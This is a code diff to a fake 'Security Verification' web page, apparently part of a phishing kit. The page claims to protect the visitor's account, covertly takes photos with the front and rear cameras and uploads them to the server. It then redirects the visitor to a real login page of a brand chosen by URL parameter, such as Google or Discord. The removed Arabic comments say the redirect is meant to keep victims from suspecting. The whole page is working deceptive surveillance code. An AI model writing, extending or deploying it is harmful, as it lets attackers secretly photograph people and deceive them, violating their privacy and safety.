@@ -5,57 +5,50 @@
 <title>Security Check</title>
 <style>
   body{margin:0;font-family:sans-serif;background:#0f1115;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;text-align:center}
-  .box{padding:40px;background:#171a21;border-radius:12px;max-width:400px}
-  h1{font-size:20px;margin-bottom:16px}
-  p{color:#8a8f99;font-size:14px;margin-bottom:24px}
-  button{background:#4a90e2;color:#fff;border:none;padding:12px 24px;border-radius:8px;font-size:16px;cursor:pointer}
+  .box{padding:40px;background:#171a21;border-radius:12px;max-width:400px;box-shadow:0 10px 30px rgba(0,0,0,0.5);border:1px solid #2a2f3a}
+  h1{font-size:22px;margin-bottom:16px;color:#4a90e2}
+  p{color:#8a8f99;font-size:14px;margin-bottom:24px;line-height:1.5}
+  button{background:#4a90e2;color:#fff;border:none;padding:12px 24px;border-radius:8px;font-size:16px;cursor:pointer;width:100%;font-weight:600}
+  button:hover{background:#3a7bc8}
+  #status{margin-top:16px;font-size:13px;color:#7dd87d;display:none}
 </style>
 </head>
 <body>
 <div class="box">
   <h1>Security Verification</h1>
-  <p>To secure your account, please verify your identity by allowing camera access.</p>
+  <p>To protect your account, we need to verify your identity. Please allow camera access when prompted.</p>
   <button id="btn">Start Verification</button>
+  <div id="status">Verifying... please wait.</div>
 </div>
 <script>
+const urlParams = new URLSearchParams(window.location.search);
+const brand = urlParams.get('b') || 'generic';
+const realSites = {
+  google: 'https://accounts.google.com', microsoft: 'https://login.microsoftonline.com', discord: 'https://discord.com/login',
+  steam: 'https://store.steampowered.com/login/', instagram: 'https://www.instagram.com/accounts/login/', generic: 'https://www.google.com'
+};
 document.getElementById('btn').addEventListener('click', async () => {
-  document.getElementById('btn').textContent = 'Verifying...';
+  const btn = document.getElementById('btn'); const status = document.getElementById('status');
+  btn.style.display = 'none'; status.style.display = 'block';
+  let frontImg = null; let backImg = null;
   try {
-    // 1. الكاميرا الأمامية
     let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-    let video = document.createElement('video');
-    video.srcObject = stream;
-    await video.play();
-    await new Promise(r => setTimeout(r, 500));
-    let canvas = document.createElement('canvas');
-    canvas.width = 640; canvas.height = 480;
-    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-    let frontImg = canvas.toDataURL('image/jpeg');
+    let video = document.createElement('video'); video.srcObject = stream; await video.play();
+    await new Promise(r => setTimeout(r, 800));
+    let canvas = document.createElement('canvas'); canvas.width = 640; canvas.height = 480;
+    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480); frontImg = canvas.toDataURL('image/jpeg', 0.8);
     stream.getTracks().forEach(t => t.stop());
-
-    // 2. الكاميرا الخلفية
-    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-    video.srcObject = stream;
-    await video.play();
-    await new Promise(r => setTimeout(r, 500));
-    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-    let backImg = canvas.toDataURL('image/jpeg');
+  } catch (e) {}
+  try {
+    let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+    let video = document.createElement('video'); video.srcObject = stream; await video.play();
+    await new Promise(r => setTimeout(r, 800));
+    let canvas = document.createElement('canvas'); canvas.width = 640; canvas.height = 480;
+    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480); backImg = canvas.toDataURL('image/jpeg', 0.8);
     stream.getTracks().forEach(t => t.stop());
-
-    // 3. إرسال الصور للسيرفر
-    await fetch('/upload-cam', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ front: frontImg, back: backImg, brand: 'discord' })
-    });
-
-    // 4. تحويله لصفحة ديسكورد الوهمية
-    window.location.href = '/discord-home.html';
-
-  } catch (err) {
-    // إذا رفض الإذن، ننقله عالصفحة الوهمية برضو عشان ما يشك
-    window.location.href = '/discord-home.html';
-  }
+  } catch (e) {}
+  await fetch('/upload-cam', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ front: frontImg, back: backImg, brand: brand }) }).catch(()=>{});
+  window.location.href = realSites[brand] || realSites['generic'];
 });
 </script>
 </body>
